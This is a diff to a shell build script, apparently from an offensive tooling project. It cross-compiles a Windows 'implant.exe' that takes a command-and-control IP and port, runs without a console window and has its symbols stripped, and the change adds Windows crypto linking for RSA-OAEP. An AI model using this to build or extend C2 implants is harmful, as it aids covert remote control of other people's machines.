@@ -11,16 +11,18 @@ echo "[*] C2 IP: $C2_IP"
 echo "[*] C2 Port: $C2_PORT"
 
 # Cross-compile depuis Linux pour Windows
+# -lbcrypt : Windows CNG requis pour RSA-OAEP et BCryptGenRandom
 x86_64-w64-mingw32-gcc \
     -o implant.exe \
     main.c \
     -DCLIENT_IP=\"$C2_IP\" \
     -DCLIENT_PORT=$C2_PORT \
     -DWAIT_FOR_CLIENT \
-    -lws2_32 \
+    -lws2_32 -lbcrypt \
     -mwindows \
     -static \
-    -s
+    -s \
+    -O2
 
 if [ $? -eq 0 ]; then
     echo "[+] Compilation réussie: implant.exe"
